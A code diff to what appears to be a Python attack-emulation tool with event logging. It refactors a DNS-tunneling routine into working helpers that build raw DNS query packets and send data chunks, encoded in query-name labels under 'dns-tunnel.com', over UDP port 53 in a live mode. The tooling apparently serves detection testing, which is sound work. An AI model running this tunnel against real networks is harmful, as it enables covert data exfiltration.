@@ -9,6 +9,7 @@ import os
 import shlex
 import shutil
 import socket
+import struct
 import subprocess
 import sys
 import time
@@ -226,9 +227,40 @@ def _run_port_sweep(log: EventLog, plan: dict[str, Any]) -> None:
     )
 
 
+def _encode_qname(fqdn: str) -> bytes:
+    fqdn = fqdn.rstrip(".")
+    encoded = b""
+    for label in fqdn.split("."):
+        if not label or len(label) > 63:
+            raise ValueError(f"invalid DNS label: {label!r}")
+        encoded += struct.pack("B", len(label)) + label.encode("ascii")
+    return encoded + b"\x00"
+
+
+def _build_dns_query_packet(fqdn: str, *, qtype: int = 1) -> tuple[int, bytes]:
+    txn_id = struct.unpack("!H", uuid.uuid4().bytes[:2])[0]
+    header = struct.pack("!HHHHHH", txn_id, 0x0100, 1, 0, 0, 0)
+    question = _encode_qname(fqdn) + struct.pack("!HH", qtype, 1)
+    return txn_id, header + question
+
+
+def _send_dns_tunnel_query(target: str, fqdn: str, port: int = 53) -> dict[str, Any]:
+    txn_id, packet = _build_dns_query_packet(fqdn)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.sendto(packet, (target, port))
+    finally:
+        sock.close()
+    return {
+        "query_id": f"{txn_id:04x}",
+        "bytes_sent": len(packet),
+        "port": port,
+        "outcome": "sent",
+    }
+
+
 def _run_dns_tunnel(log: EventLog, plan: dict[str, Any]) -> None:
     queries = plan.get("queries") or []
-    timeout = float(plan.get("timeout", 0.05))
     mode = plan.get("mode", "live")
     domain = plan.get("domain", "dns-tunnel.com")
     session_id = uuid.uuid4().hex[:6]
@@ -243,38 +275,55 @@ def _run_dns_tunnel(log: EventLog, plan: dict[str, Any]) -> None:
     for item in queries:
         target = item["target"]
         fqdn = item["fqdn"]
+        seq = item["seq"]
         log.append(
             event="dns_tunnel_chunk_created",
             status="info",
             target=target,
             artifact=fqdn,
-            evidence={"seq": item["seq"], "fqdn": fqdn, "domain": domain},
+            evidence={
+                "seq": seq,
+                "fqdn": fqdn,
+                "domain": domain,
+                "chunk_bytes": item.get("chunk_bytes"),
+                "label_length": item.get("label_length"),
+            },
         )
+        send_meta: dict[str, Any] = {"outcome": "mock"}
         if mode != "mock":
             try:
-                payload = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
-                label = fqdn.split(".", 1)[0]
-                for part in label.split("."):
-                    payload += bytes([len(part)]) + part.encode("ascii")
-                payload += b"\x00\x00\x01\x00\x01"
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-                    sock.settimeout(timeout)
-                    sock.sendto(payload, (target, 53))
-            except OSError:
-                pass
+                send_meta = _send_dns_tunnel_query(target, fqdn)
+            except OSError as exc:
+                send_meta = {"outcome": "error", "message": str(exc)}
+
+        query_evidence = {
+            "session_id": session_id,
+            "seq": seq,
+            "fqdn": fqdn,
+            "qtype": "A",
+            "port": 53,
+            **send_meta,
+        }
+        log.append(
+            event="dns_query_sent",
+            status="sent",
+            target=target,
+            artifact=fqdn,
+            evidence=dict(query_evidence),
+        )
         log.append(
             event="dns_tunnel_query_sent",
             status="sent",
             target=target,
             artifact=fqdn,
-            evidence={"fqdn": fqdn, "seq": item["seq"]},
+            evidence=query_evidence,
         )
         sent += 1
     log.append(
         event="dns_tunnel_completed",
         status="info",
         target=first_target,
-        evidence={"queries_sent": sent, "session_id": session_id},
+        evidence={"queries_sent": sent, "chunks_sent": sent, "session_id": session_id},
     )
 
 
